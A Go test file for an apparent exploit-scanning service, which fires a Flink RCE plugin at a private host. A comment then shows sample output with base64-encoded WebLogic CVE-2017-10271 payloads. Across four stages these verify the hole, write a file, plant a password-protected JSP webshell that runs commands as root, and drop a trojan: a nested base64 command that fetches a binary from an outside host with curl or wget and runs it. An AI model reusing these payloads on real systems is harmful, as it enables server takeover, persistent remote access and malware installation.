package main

import (
	"context"
	"encoding/json"
	"fmt"
	"testing"

	unit "github.com/jstang9527/buoy/micro/handler"
	pb "github.com/jstang9527/buoy/micro/proto/grpc"
	"google.golang.org/grpc"
)

// TestVerify Poc 漏洞验证及漏洞扫描
func TestVerify(t *testing.T) {
	// 1.连接注册中心获取服务节点
	user := unit.InitUser("pocsuite", "172.31.50.249:8500")
	if err := user.RegistryConn(); err != nil {
		t.Errorf("Failed conn Registry center, info: %v\n", err)
		return
	}
	node, err := user.GetNodeByRamdom()
	if err != nil {
		t.Errorf("Failed get node, info: %v\n", err)
		return
	}
	fmt.Printf("%#v\n", node) // &registry.Node{Id:"q24cav79jo", Address:"172.31.50.249:57000", Metadata:map[string]string{}}
	// 2.连接服务节点调用方法
	conn, err := grpc.Dial(node.Address, grpc.WithInsecure())
	if err != nil {
		t.Errorf("Failed connect service node, info: %v\n", err)
		return
	}
	defer conn.Close()

	call := pb.NewPocScanClient(conn)
	req := &pb.PocRequest{
		Exploit:    true,
		Target:     "172.31.50.252:8081",
		AssetId:    "rpc_ff",
		PocPlugins: []string{"Flink_201111_Unauth_RCE.py"}, // Weblogic_171023_wls_CVE_2017_10271_RCE.py
	}
	resp, err := call.Verify(context.Background(), req)
	if err != nil {
		t.Errorf("Failed call method(Verify), info: %#v\n", err)
		return
	}

	// 3.输出结果
	result := &pb.PocResponse{
		VerifyInfo:   resp.VerifyInfo,
		ExploitInfo:  resp.ExploitInfo,
		WebshellInfo: resp.WebshellInfo,
		TrojanInfo:   resp.TrojanInfo,
	}
	data, _ := json.Marshal(result)
	fmt.Printf("%s\n", data)
}

/*
{
	"VerifyInfo":{
		"PostData":"PHNvYXBlbnY6RW52ZWxvcGUgeG1sbnM6c29hcGVudj0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvc29hcC9lbnZlbG9wZS8iPgogICAgICAgICAgICA8c29hcGVudjpIZWFkZXI+CiAgICAgICAgICAgIDx3b3JrOldvcmtDb250ZXh0IHhtbG5zOndvcms9Imh0dHA6Ly9iZWEuY29tLzIwMDQvMDYvc29hcC93b3JrYXJlYS8iPgogICAgICAgICAgICA8amF2YSB2ZXJzaW9uPSIxLjguMF8xMzEiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICAgICAgICAgICA8dm9pZCBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICAgICAgPGFycmF5IGNsYXNzPSJqYXZhLmxhbmcuU3RyaW5nIiBsZW5ndGg9IjMiPgogICAgICAgICAgICA8dm9pZCBpbmRleD0iMCI+CiAgICAgICAgICAgIDxzdHJpbmc+L2Jpbi9iYXNoPC9zdHJpbmc+CiAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgPHZvaWQgaW5kZXg9IjEiPgogICAgICAgICAgICA8c3RyaW5nPi1jPC9zdHJpbmc+CiAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgPHZvaWQgaW5kZXg9IjIiPgogICAgICAgICAgICA8c3RyaW5nPnRvdWNoIHh4eDIudHh0PC9zdHJpbmc+CiAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgPC9hcnJheT4KICAgICAgICAgICAgPHZvaWQgbWV0aG9kPSJzdGFydCIvPjwvdm9pZD4KICAgICAgICAgICAgPC9qYXZhPgogICAgICAgICAgICA8L3dvcms6V29ya0NvbnRleHQ+CiAgICAgICAgICAgIDwvc29hcGVudjpIZWFkZXI+CiAgICAgICAgICAgIDxzb2FwZW52OkJvZHkvPgogICAgICAgICAgICA8L3NvYXBlbnY6RW52ZWxvcGU+",
		"Result":"Find Keyinfo In Response Data, Info: \u003cfaultcode\u003eS:Server\u003c/faultcode\u003e\u003cfaultstring\u003e0\u003c/faultstring\u003e",
		"URL":"http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl"
	},
	"ExploitInfo":{
		"PostData":"PHNvYXBlbnY6RW52ZWxvcGUgeG1sbnM6c29hcGVudj0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvc29hcC9lbnZlbG9wZS8iPgogICAgICAgICAgICA8c29hcGVudjpIZWFkZXI+CiAgICAgICAgICAgIDx3b3JrOldvcmtDb250ZXh0IHhtbG5zOndvcms9Imh0dHA6Ly9iZWEuY29tLzIwMDQvMDYvc29hcC93b3JrYXJlYS8iPgogICAgICAgICAgICA8amF2YT4KICAgICAgICAgICAgPGphdmEgdmVyc2lvbj0iMS40LjAiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICAgICAgICAgICA8b2JqZWN0IGNsYXNzPSJqYXZhLmlvLlByaW50V3JpdGVyIj4gPHN0cmluZz5zZXJ2ZXJzL0FkbWluU2VydmVyL3RtcC9fV0xfaW50ZXJuYWwvd2xzLXdzYXQvNTRwMTd3L3dhci8xMDAwMDExLnR4dDwvc3RyaW5nPgogICAgICAgICAgICA8dm9pZCBtZXRob2Q9InByaW50bG4iPgogICAgICAgICAgICA8c3RyaW5nPldlYmxvZ2ljIFZ1bG5lcmFiaWxpdHkgVGVzdCE8L3N0cmluZz4KICAgICAgICAgICAgPC92b2lkPgogICAgICAgICAgICA8dm9pZCBtZXRob2Q9ImNsb3NlIi8+CiAgICAgICAgICAgIDwvb2JqZWN0PgogICAgICAgICAgICA8L2phdmE+CiAgICAgICAgICAgIDwvamF2YT4KICAgICAgICAgICAgPC93b3JrOldvcmtDb250ZXh0PgogICAgICAgICAgICA8L3NvYXBlbnY6SGVhZGVyPgogICAgICAgICAgICA8c29hcGVudjpCb2R5Lz4KICAgICAgICAgICAgPC9zb2FwZW52OkVudmVsb3BlPg==",
		"Result":"Exploit Successfully, touch file of content=[Weblogic Vulnerability Test!\n] and effect http://172.31.50.252:7001/wls-wsat/1000011.txt",
		"URL":"http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl"
	},
	"WebshellInfo":{
		"PostData":"PHNvYXBlbnY6RW52ZWxvcGUgeG1sbnM6c29hcGVudj0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvc29hcC9lbnZlbG9wZS8iPgogICAgICAgICAgICA8c29hcGVudjpIZWFkZXI+CiAgICAgICAgICAgIDx3b3JrOldvcmtDb250ZXh0IHhtbG5zOndvcms9Imh0dHA6Ly9iZWEuY29tLzIwMDQvMDYvc29hcC93b3JrYXJlYS8iPgogICAgICAgICAgICA8amF2YT4KICAgICAgICAgICAgPGphdmEgdmVyc2lvbj0iMS40LjAiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICAgICAgICAgICA8b2JqZWN0IGNsYXNzPSJqYXZhLmlvLlByaW50V3JpdGVyIj4gPHN0cmluZz5zZXJ2ZXJzL0FkbWluU2VydmVyL3RtcC9fV0xfaW50ZXJuYWwvd2xzLXdzYXQvNTRwMTd3L3dhci90ZXN0LmpzcDwvc3RyaW5nPgogICAgICAgICAgICA8dm9pZCBtZXRob2Q9InByaW50bG4iPgogICAgICAgICAgICA8c3RyaW5nPjwhW0NEQVRBWzwlCiAgICAgICAgICAgICAgICBpZigiMDIzIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoInB3ZCIpKSl7CiAgICAgICAgICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiaSIpKS5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgICAgICAgICAgaW50IGEgPSAtMTsKICAgICAgICAgICAgICAgIGJ5dGVbXSBiID0gbmV3IGJ5dGVbMjA0OF07CiAgICAgICAgICAgICAgICBvdXQucHJpbnQoIjxwcmU+Iik7CiAgICAgICAgICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICAgICAgICAgIG91dC5wcmludGxuKG5ldyBTdHJpbmcoYikpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3V0LnByaW50KCI8L3ByZT4iKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAlPl1dPjwvc3RyaW5nPgogICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgIDx2b2lkIG1ldGhvZD0iY2xvc2UiLz4KICAgICAgICAgICAgPC9vYmplY3Q+CiAgICAgICAgICAgIDwvamF2YT4KICAgICAgICAgICAgPC9qYXZhPgogICAgICAgICAgICA8L3dvcms6V29ya0NvbnRleHQ+CiAgICAgICAgICAgIDwvc29hcGVudjpIZWFkZXI+CiAgICAgICAgICAgIDxzb2FwZW52OkJvZHkvPgogICAgICAgICAgICA8L3NvYXBlbnY6RW52ZWxvcGU+",
		"Result":"Exploit Successfully, Get response_data=[\u003cpre\u003eroot\u003c/pre\u003e] by execute command effect webshell http://172.31.50.252:7001/wls-wsat/test.jsp?pwd=023\u0026i=whoami",
		"URL":"http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl"
	},
	"TrojanInfo":{
		"PostData":"PHNvYXBlbnY6RW52ZWxvcGUgeG1sbnM6c29hcGVudj0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvc29hcC9lbnZlbG9wZS8iIHhtbG5zOndzYT0iaHR0cDovL3d3dy53My5vcmcvMjAwNS8wOC9hZGRyZXNzaW5nIiB4bWxuczphc3k9Imh0dHA6Ly93d3cuYmVhLmNvbS9hc3luYy9Bc3luY1Jlc3BvbnNlU2VydmljZSI+CiAgICAgICAgICAgIDxzb2FwZW52OkhlYWRlcj4KICAgICAgICAgICAgPHdzYTpBY3Rpb24+eHg8L3dzYTpBY3Rpb24+CiAgICAgICAgICAgIDx3c2E6UmVsYXRlc1RvPnh4PC93c2E6UmVsYXRlc1RvPgogICAgICAgICAgICA8d29yazpXb3JrQ29udGV4dCB4bWxuczp3b3JrPSJodHRwOi8vYmVhLmNvbS8yMDA0LzA2L3NvYXAvd29ya2FyZWEvIj4KICAgICAgICAgICAgPHZvaWQgY2xhc3M9ImphdmEubGFuZy5Qcm9jZXNzQnVpbGRlciI+CiAgICAgICAgICAgIDxhcnJheSBjbGFzcz0iamF2YS5sYW5nLlN0cmluZyIgbGVuZ3RoPSIzIj4KICAgICAgICAgICAgPHZvaWQgaW5kZXg9IjAiPgogICAgICAgICAgICA8c3RyaW5nPi9iaW4vYmFzaDwvc3RyaW5nPgogICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgIDx2b2lkIGluZGV4PSIxIj4KICAgICAgICAgICAgPHN0cmluZz4tYzwvc3RyaW5nPgogICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgIDx2b2lkIGluZGV4PSIyIj4KICAgICAgICAgICAgPHN0cmluZz5lY2hvIFkzVnliQ0F0VmlBbVBpQXZaR1YyTDI1MWJHdzdJR2xtSUZzZ0pEOGdMV1Z4SURBZ1hUdDBhR1Z1SUdOMWNtd2dMVThnYUhSMGNEb3ZMekUzTWk0ek1TNDFNQzR5TkRrdmRISnZhbUZ1TDNSeWIycGhianNnWld4elpTQjNaMlYwSUMxV0lDWStJQzlrWlhZdmJuVnNiRHNnYVdZZ1d5QWtQeUF0WlhFZ01DQmRPM1JvWlc0Z2QyZGxkQ0JvZEhSd09pOHZNVGN5TGpNeExqVXdMakkwT1M5MGNtOXFZVzR2ZEhKdmFtRnVPeUJtYVRzZ1pta2dKaVlnWTJodGIyUWdLM2dnZEhKdmFtRnVKaVlnTGk5MGNtOXFZVzRnTFMxelpYSjJaWEpmYldWMFlXUmhkR0VnYVdROWFuTjBZVzVuT1RVeU55QXRMWE5sY25abGNsOXRaWFJoWkdGMFlTQnRjVDB4TnpJdU16RXVOVEF1TWpRNU9qWXpOemtnTFMxelpYSjJaWEpmYm1GdFpTQnFjM1JoYm1jNU5USTNJQzB0Y21WbmFYTjBjbmxmWVdSa2NtVnpjeUF4TnpJdU16RXVOVEF1TWpRNU9qZzFNREE9IHwgYmFzZTY0IC1kIHwgYmFzaDwvc3RyaW5nPgogICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgIDwvYXJyYXk+CiAgICAgICAgICAgIDx2b2lkIG1ldGhvZD0ic3RhcnQiLz48L3ZvaWQ+CiAgICAgICAgICAgIDwvd29yazpXb3JrQ29udGV4dD4KICAgICAgICAgICAgPC9zb2FwZW52OkhlYWRlcj4KICAgICAgICAgICAgPHNvYXBlbnY6Qm9keT4KICAgICAgICAgICAgPGFzeTpvbkFzeW5jRGVsaXZlcnkvPgogICAgICAgICAgICA8L3NvYXBlbnY6Qm9keT48L3NvYXBlbnY6RW52ZWxvcGU+",
		"Result":"Inject Trojan Successfully",
		"URL":"http://172.31.50.252:7001/wls-wsat/CoordinatorPortType?wsdl"
	}
}
*/
